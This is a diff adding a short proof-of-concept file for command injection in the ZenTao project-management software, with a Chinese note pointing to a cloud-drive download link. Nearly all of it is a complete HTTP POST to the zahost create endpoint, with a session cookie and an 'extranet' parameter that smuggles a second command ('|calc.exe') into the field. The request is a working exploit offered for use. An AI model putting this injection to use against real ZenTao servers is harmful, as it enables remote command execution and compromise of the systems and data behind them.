@@ -1,0 +1,26 @@
+该poc来自链接：https://pan.baidu.com/s/1wZoSo30EXiw9vMQBPtKFWg?pwd=zyxa 
+提取码：zyxa
+详情自行查看
+
+
+
+POC:
+
+POST /zentaopms/www/index.php?m=zahost&f=create HTTP/1.1
+Host: 127.0.0.1
+UserAgent: Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/110.0Accept:application/json,text/javascript,*/*;q=0.01
+Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding:gzip,deflate
+Referer:http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create
+Content-Type:application/x-www-form-urlencoded;charset=UTF-8
+X-Requested-With:XMLHttpRequest
+Content-Length:134
+Origin:http://127.0.0.1
+Connection:close
+Cookie:zentaosid=dhjpu2i3g51l6j5eba85aql27f;lang=zhcn;device=desktop;theme=default;tab=qa;windowWidth=1632;windowHeight=783
+Sec-Fetch-Dest:empty
+Sec-Fetch-Mode:cors
+Sec-Fetch-Site:same-origin
+
+vsoft=kvm&hostType=physical&name=penson&extranet=127.0.0.1%7Ccalc.exe&cpuCores=
+2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=za
